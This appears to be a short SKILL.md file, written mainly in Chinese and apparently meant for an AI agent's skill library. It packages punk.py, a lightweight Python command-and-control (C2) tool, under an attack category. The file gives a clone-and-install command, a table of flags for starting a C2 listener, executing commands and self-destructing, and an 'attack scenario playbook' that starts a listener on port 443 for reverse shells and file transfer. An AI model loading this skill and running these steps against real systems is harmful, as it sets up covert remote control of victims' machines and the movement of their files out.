---
name: punk-c2
description: punk.py: 轻量 C2。信号:c2,命令控制,起 C2,执行,自毁。
---

# punk.py

- 攻击大类:C35 C2框架与远控
- 上游仓库:https://github.com/r3vn/punk.py
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/r3vn/punk.py && cd punk.py && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python punk.py -l 10.0.0.5 -p 4444` | 起 C2 |
| `-e 'cmd'` | 执行 |
| `-s` | 自毁 |

## 攻击场景 Playbook

### 轻量 C2

```bash
python punk.py -l 0.0.0.0 -p 443
# 反弹+文件传输
```

## 注意事项

轻量 Python C2。
